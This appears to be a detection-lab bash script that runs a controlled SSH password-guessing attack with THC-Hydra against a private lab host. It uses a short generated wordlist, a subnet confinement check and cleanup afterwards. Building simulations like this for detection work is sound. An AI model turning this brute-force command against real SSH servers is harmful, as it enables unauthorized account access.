#!/usr/bin/env bash
# ==============================================================================
# Script Name: run-hydra-simulation.sh
# Scenario: INC-001 - Controlled SSH Brute Force via THC-Hydra
# MITRE ATT&CK: T1110.001 - Password Guessing
# Platform: Kali Linux (192.168.56.10)
# ==============================================================================

set -o errexit
set -o pipefail
set -o nounset

TARGET_IP="192.168.56.30"
TARGET_PORT="22"
TARGET_USER="lab-target"
WORDLIST="/tmp/detectlab-passwords.txt"

# Confinement check
if [[ ! "$TARGET_IP" =~ ^192\.168\.56\. ]]; then
    echo "[!] SAFETY ERROR: Target IP $TARGET_IP is not within lab subnet!"
    exit 1
fi

echo "=================================================================="
echo "   THC-Hydra Controlled SSH Brute Force Simulation (INC-001)     "
echo "=================================================================="
echo "Target: $TARGET_IP:$TARGET_PORT | User: $TARGET_USER"

# Create controlled 15-password dictionary
cat << 'EOF' > "$WORDLIST"
Winter2024!
Password123!
Admin2024!
LabTest#1
Security!99
Welcome2024!
Secret#2024
Summer2024!
Football123!
Dragon#2024
Master2024!
AlphaBravo1!
Charlie2024!
DeltaEcho#1
GuessMe123!
EOF

echo "[*] Created temporary wordlist ($WORDLIST) with 15 entries."
echo "[*] Launching Hydra with 1 thread (-t 1) to generate realistic burst telemetry..."

hydra -t 1 -l "$TARGET_USER" -P "$WORDLIST" -s "$TARGET_PORT" ssh://"$TARGET_IP" -V || true

rm -f "$WORDLIST"
echo "[+] Simulation completed. Wordlist cleaned."
echo "=================================================================="
